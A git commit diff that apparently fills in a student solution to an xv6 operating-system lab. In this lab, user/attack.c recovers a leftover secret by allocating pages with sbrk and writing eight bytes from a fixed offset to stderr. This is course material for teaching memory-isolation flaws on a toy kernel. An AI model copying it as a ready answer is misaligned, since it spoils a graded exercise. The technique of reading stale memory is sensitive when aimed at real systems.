f0341faad0d93cb01a4b2ba65421cfee70f418b9
bernard <1293465052@qq.com>
2025-01-28 00:37:32 +1100

    Update attack.c

--- user/attack.c
+++ user/attack.c
@@ -1,13 +1,21 @@
 #include "kernel/types.h"
+#include "kernel/stat.h"
 #include "kernel/fcntl.h"
 #include "user/user.h"
 #include "kernel/riscv.h"
 
+#define PGSIZE 4096
+#define PAGES  40
+
 int
 main(int argc, char *argv[])
 {
-  // your code here.  you should write the secret to fd 2 using write
-  // (e.g., write(2, secret, 8)
+  if (argc != 1) {
+    printf("Usage: attack\n");
+  }
+  char *buf = sbrk(PGSIZE * 32);
+  buf = buf + 16 * PGSIZE;
+  write(2, buf + 32, 8);
 
-  exit(1);
+  exit(0);
 }
